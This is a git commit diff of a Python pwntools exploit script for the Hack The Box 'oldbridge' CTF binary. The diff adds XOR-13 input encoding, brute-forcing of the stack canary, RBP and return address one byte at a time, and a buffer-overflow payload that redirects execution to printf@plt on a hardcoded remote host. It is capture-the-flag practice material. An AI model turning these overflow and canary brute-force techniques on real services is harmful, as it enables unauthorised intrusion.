895e973e21a1598b20afaf5c4778623f0e2b9032
JustBeYou <mihailferaru2000@gmail.com>
2018-06-22 15:52:33 +0300

    Fixed bug. Input must be xored by 13

--- HTB/pwn/oldbridge.py
+++ HTB/pwn/oldbridge.py
@@ -1,7 +1,5 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template ./exe/oldbridge --host 88.198.233.174 --port 32922
 from pwn import *
 from session import * # custom module for saving data
 
@@ -14,7 +12,7 @@ exe = context.binary = ELF('./exe/oldbridge')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
 host = args.HOST or '88.198.233.174'
-port = int(args.PORT or 32922)
+port = int(args.PORT or 33429)
 
 def local(argv=[], *a, **kw):
     '''Connect to the process on the local host'''
@@ -39,8 +37,6 @@ def start(argv=[], *a, **kw):
         return remote(argv, *a, **kw)
 
 # Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
 break main
 set follow-fork-mode child
@@ -56,7 +52,29 @@ continue
 # NX:       NX enabled
 # PIE:      PIE enabled
 
-# constants
+"""
+Pseudo-code of check_username
+__int64 __fastcall check_username(int a1)
+{
+  unsigned int v2; // [rsp+14h] [rbp-41Ch]
+  int i; // [rsp+18h] [rbp-418h]
+  int v4; // [rsp+1Ch] [rbp-414h]
+  char buf[1032]; // [rsp+20h] [rbp-410h]
+  unsigned __int64 v6; // [rsp+428h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  v2 = 0;
+  write(a1, "Username: ", 0xAuLL);
+  v4 = read(a1, buf, 1056uLL);
+  for ( i = 0; i < v4; ++i )
+    buf[i] ^= 13u;
+  if ( !memcmp(buf, "il{dih", 6uLL) )
+    v2 = 1;
+  return v2;
+}
+"""
+
+# messages from app
 SUCCESS_MSG = "Username found!"
 PROMPT_MSG = "Username: "
 
@@ -66,31 +84,32 @@ config = {}
 create_session("oldbridge", args.LOCAL)
 
 # username found in binary
-config['username'] = ''.join(str(chr(ord(x) ^ 13)) for x in "il{dih")
+username = "il{dih"
 # buffer size (buffer size = cookie offset)
-config['buf_size'] = 1032
+buffer_size = 1032
 # rbp offset
-config['rbp_off'] = 1040
+rbp_offset = 1040
 # rip offset
-config['rip_off'] = 1048
+rip_offset = 1048
 # stack: |buffer|cookie|rbp|rip|
 
+# the input is xor-ed
+def xor13(s):
+    return ''.join(str(chr(ord(x) ^ 13)) for x in s)
+
 # create a connection to the server
-# send some data
+# send some data (xor-ed by 13)
 # check if it crashed ;)
 def server_check(prefix_size, data, prefix = "", keep = False):
     io = start()
-    to_send = config['username'] + \
-              cyclic(prefix_size - len(config['username']) - len(prefix)) + \
-              prefix + data
+    to_send = xor13(username + \
+              cyclic(prefix_size - len(username) - len(prefix)) + \
+              prefix + data)
 
-    print (len(to_send), to_send)
     io.sendafter(PROMPT_MSG, to_send)
     recv_data = io.clean()
-    print (recv_data)
     if not keep: io.close()
     else: io.interactive()
-
     return SUCCESS_MSG in recv_data
 
 # bruteforce a 8 byte long value on the stack
@@ -99,18 +118,16 @@ def bruteforce_value(offset, prefix = ""):
     value = ""
     for y in range(8):
         log.info("Bruteforcing byte {}".format(y + 1))
-        for x in range(0x100):
+        for x in range(0x0, 0x100):
             temp_value = value + chr(x)
             log.info("Trying {}".format(hex(x)))
 
             alive = server_check(offset, temp_value, prefix = prefix)
             if alive:
                 log.success("Found byte {}".format(hex(x)))
-
                 value = temp_value
                 break
 
-    print (len(value), value)
     if len(value) == 8:
         log.success("Found: " + value)
     else:
@@ -122,32 +139,48 @@ if args.LOAD:
     config = load_vars()
     log.info("Load session {}".format(config))
 
+
 # we need the stack cookie to do a proper exploit
 if 'cookie' not in config:
-    config['cookie'] = bruteforce_value(config['buf_size'])
+    config['cookie'] = bruteforce_value(buffer_size)
+save_vars(config)
 
 # we need the rbp and rip to be leaked too
 if 'rbp' not in config:
-    config['rbp'] = bruteforce_value(config['rbp_off'], prefix = config['cookie'])
+    config['rbp'] = bruteforce_value(rbp_offset,
+                    prefix = config['cookie'])
+save_vars(config)
 if 'rip' not in config:
-    config['rip'] = bruteforce_value(config['rip_off'],
-                                     prefix = config['cookie'] + config['rbp'])
+    config['rip'] = bruteforce_value(rip_offset,
+                    prefix = config['cookie'] + config['rbp'])
+save_vars(config)
 
-log.info("Cookie: " + hex(unpack(config['cookie'])))
-log.info("RBP: " + hex(unpack(config['rbp'])))
-log.info("RIP: " + hex(unpack(config['rip'])))
-
+log.info("Cookie: " + hex(u64(config['cookie'])))
+log.info("RBP: " + hex(u64(config['rbp'])))
+log.info("RIP: " + hex(u64(config['rip'])))
 
 # check if leaked values are still good (debug only)
-alive = server_check(config['buf_size'], config['cookie'] + config['rbp'] + config['rip'], keep = True)
+"""alive = server_check(buffer_size,
+                     config['cookie'] + config['rbp'] + config['rip'])
 if not alive:
-    log.error("Stack cookie is wrong")
+    log.error("Run bruteforce again")
 else:
-    log.success("Good stack cookie")
+    log.success("All good")
+"""
 
-exit()
-#log.info("Payload")
-#io.sendafter(PROMPT_MSG, payload)
-#print (io.clean())
+def craft(data):
+    payload = username + cyclic(buffer_size - len(username)) + data
+    return xor13(payload)
+
+printf_plt = 0x940
+rip_printf = u64(config['rip']) // 0x10000 * 0x10000 + printf_plt
+log.info("printf@plt: " + hex(rip_printf))
+
+payload = craft(config['cookie'] + config['rbp'] + p64(rip_printf))
+
+io = start()
+log.info("Payload: " + payload)
+io.sendafter(PROMPT_MSG, payload)
+print ("DATA:" + io.clean())
 # save the session
 save_vars(config)
